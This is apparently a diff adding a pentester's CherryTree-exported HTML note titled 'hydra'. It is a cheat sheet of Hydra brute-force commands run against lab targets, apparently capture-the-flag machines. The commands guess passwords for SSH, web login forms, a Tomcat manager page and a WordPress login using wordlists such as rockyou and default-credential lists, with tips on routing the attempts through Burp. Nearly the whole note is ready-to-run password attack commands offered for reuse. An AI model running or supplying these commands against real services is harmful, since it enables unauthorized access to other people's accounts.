@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>hydra</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>hydra</h1><br/>hydra -e nsr -l charles -P old-password.bak -t 6 ssh://192.168.11.129<br /><br /><br />hydra -l harvey -P /root/Desktop/Tools/Wordlists/rockyou.txt internal-01.bart.htb http-post-form &quot;/simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:Password&quot;<br /> <br /> hydra -s 8080 10.10.251.164 http-form-post &quot;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password&quot; -l admin -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -t 10 -w 30 <br /> <br /> HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C  /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 80 10.10.10.95 http-get /manager/html<br />^^forward to burp after auth attempt                     ^ to use collon sperated user:pass                                                                            ^Source port ip    http-get ^url<br />^^^^make sure intercept is OFF^^^ <br /><br />hydra -l wade -P ./fsocity.dic 10.10.163.14 -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</div></body></html>
